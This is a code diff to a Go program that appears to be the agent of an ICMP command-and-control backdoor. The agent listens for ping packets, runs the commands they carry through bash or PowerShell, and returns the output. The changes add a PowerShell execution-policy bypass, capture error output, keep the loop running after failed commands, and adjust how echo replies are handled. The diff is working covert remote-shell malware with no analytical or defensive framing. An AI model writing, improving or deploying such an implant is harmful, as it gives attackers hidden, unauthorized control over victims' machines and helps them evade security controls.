@@ -1,6 +1,7 @@
 package main
 
 import (
+	"net"
 	"os"
 	"os/exec"
 	"runtime"
@@ -16,6 +17,10 @@ import (
 
 const (
 	maxArgs = 0
+)
+
+var (
+	listenAddress net.IP = system.GetHostIP()
 )
 
 func main() {
@@ -61,7 +66,7 @@ func agentForeground() {
 
 	for {
 		// Start listener
-		conn, err := utils.ListenICMP(system.GetHostIP().String())
+		conn, err := utils.ListenICMP(listenAddress.String())
 		if err != nil {
 			logger.Log(logger.Error, "Could not start raw ICMP listener")
 			logger.LogError(err)
@@ -94,7 +99,8 @@ func agentForeground() {
 
 		// "output received by server"
 		// Don't try to execute ICMP Echo Replies
-		if icmpType == ipv4.ICMPTypeEchoReply {
+		// To fix a Windows issue, don't capture replies that originate from your own system.
+		if icmpType == ipv4.ICMPTypeEchoReply && srcAddr.String() != listenAddress.String() {
 			logger.Log(logger.Debug, "Caught Echo Reply from", srcAddr.String())
 			continue
 		}
@@ -105,15 +111,14 @@ func agentForeground() {
 		// Execute command
 		var commandOutput []byte
 		if runtime.GOOS == "windows" {
-			commandOutput, err = exec.Command("powershell.exe", "-noP", "-hi", "-c", command).Output()
+			commandOutput, err = exec.Command("powershell.exe", "-noP", "-Ep", "byPASS", "-c", command).CombinedOutput()
 		} else {
-			commandOutput, err = exec.Command("bash", "-c", command).Output()
+			commandOutput, err = exec.Command("bash", "-c", command).CombinedOutput()
 		}
 
 		if err != nil {
 			logger.Log(logger.Error, "Could not execute command:", command)
 			logger.LogError(err)
-			continue
 		}
 
 		// Send back command output
@@ -124,6 +129,8 @@ func agentForeground() {
 			continue
 		}
 
+		utils.Close(conn)
+
 		logger.Log(logger.Debug, "Command output:\n"+string(commandOutput))
 	}
 }
@@ -133,7 +140,7 @@ func agentDaemonize() {
 
 	for {
 		// Start listener
-		conn, err := utils.ListenICMP(system.GetHostIP().String())
+		conn, err := utils.ListenICMP(listenAddress.String())
 		if err != nil {
 			logger.Log(logger.Error, "Could not start raw ICMP listener") // couldn't start listener, notify and exit before daemonizing
 			logger.LogError(err)
